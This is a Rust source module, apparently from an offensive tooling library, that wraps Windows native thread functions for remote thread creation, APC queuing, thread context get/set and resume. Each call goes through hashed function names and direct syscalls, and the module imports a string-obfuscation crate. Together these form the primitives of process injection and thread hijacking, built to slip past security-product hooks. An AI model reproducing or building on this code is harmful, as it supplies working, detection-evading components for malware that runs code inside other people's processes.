use super::types::*;
use crate::ntapi::def::{CURRENT_PROCESS, THREAD_ALL_ACCESS};
use crate::syscall;
use crate::utils::{RslError, RslResult};
use core::ffi::c_void;
use obfstr::obfstr;

pub fn create_remote_thread_ex(
    process_handle: isize,
    start: usize,
    arg: usize,
) -> RslResult<isize> {
    let mut thread_handle: isize = 0;
    let nt_create_hash = crate::dbj2_hash!(b"NtCreateThreadEx");

    let status = unsafe {
        syscall!(
            nt_create_hash,
            NtCreateThreadExFn,
            (&mut thread_handle as *mut isize as u64),
            THREAD_ALL_ACCESS as u64,
            core::ptr::null_mut::<c_void>() as u64,
            process_handle as u64,
            (start as *mut c_void) as u64,
            (arg as *mut c_void) as u64,
            0u32 as u64,
            0usize as u64,
            0usize as u64,
            0usize as u64,
            core::ptr::null_mut::<c_void>() as u64,
        )
    };

    match status {
        Some(s) if s < 0 => Err(RslError::NtStatus(s)),
        Some(_) => Ok(thread_handle),
        None => Err(RslError::SyscallFailed(nt_create_hash)),
    }
}

pub fn create_thread_ex(start: usize, arg: usize) -> RslResult<isize> {
    create_remote_thread_ex(CURRENT_PROCESS, start, arg)
}

pub fn queue_apc_thread(thread_handle: isize, routine: usize) -> RslResult<()> {
    let nt_queue_hash = crate::dbj2_hash!(b"NtQueueApcThread");

    let qstatus = unsafe {
        syscall!(
            nt_queue_hash,
            NtQueueApcThreadFn,
            thread_handle as u64,
            (routine as *mut c_void) as u64,
            0u64,
            0u64,
            0u64,
        )
    };

    match qstatus {
        Some(s) if s < 0 => Err(RslError::NtStatus(s)),
        Some(_) => Ok(()),
        None => Err(RslError::SyscallFailed(nt_queue_hash)),
    }
}

pub fn test_alert() -> RslResult<()> {
    let nt_delay_hash = crate::dbj2_hash!(b"NtDelayExecution");
    let mut interval: i64 = 0; // No delay, just check for APCs

    let status = unsafe {
        syscall!(
            nt_delay_hash,
            NtDelayExecutionFn,
            1u8 as u64, // Alertable = TRUE
            (&mut interval as *mut i64 as u64)
        )
    };

    match status {
        Some(s) if s < 0 => Err(RslError::NtStatus(s)),
        Some(_) => Ok(()),
        None => Err(RslError::SyscallFailed(nt_delay_hash)),
    }
}

pub fn get_context_thread(thread_handle: isize, context: *mut core::ffi::c_void) -> RslResult<()> {
    let nt_get_context_hash = crate::dbj2_hash!(b"NtGetContextThread");

    let status = unsafe {
        syscall!(
            nt_get_context_hash,
            NtGetContextThreadFn,
            thread_handle as u64,
            context as u64
        )
    };

    match status {
        Some(s) if s < 0 => Err(RslError::NtStatus(s)),
        Some(_) => Ok(()),
        None => Err(RslError::SyscallFailed(nt_get_context_hash)),
    }
}

pub fn set_context_thread(
    thread_handle: isize,
    context: *const core::ffi::c_void,
) -> RslResult<()> {
    let nt_set_context_hash = crate::dbj2_hash!(b"NtSetContextThread");

    let status = unsafe {
        syscall!(
            nt_set_context_hash,
            NtSetContextThreadFn,
            thread_handle as u64,
            context as u64
        )
    };

    match status {
        Some(s) if s < 0 => Err(RslError::NtStatus(s)),
        Some(_) => Ok(()),
        None => Err(RslError::SyscallFailed(nt_set_context_hash)),
    }
}

pub fn resume_thread(thread_handle: isize) -> RslResult<u32> {
    let nt_resume_hash = crate::dbj2_hash!(b"NtResumeThread");
    let mut suspend_count = 0;

    let status = unsafe {
        syscall!(
            nt_resume_hash,
            NtResumeThreadFn,
            thread_handle as u64,
            (&mut suspend_count as *mut u32 as u64)
        )
    };

    match status {
        Some(s) if s < 0 => Err(RslError::NtStatus(s)),
        Some(_) => Ok(suspend_count),
        None => Err(RslError::SyscallFailed(nt_resume_hash)),
    }
}
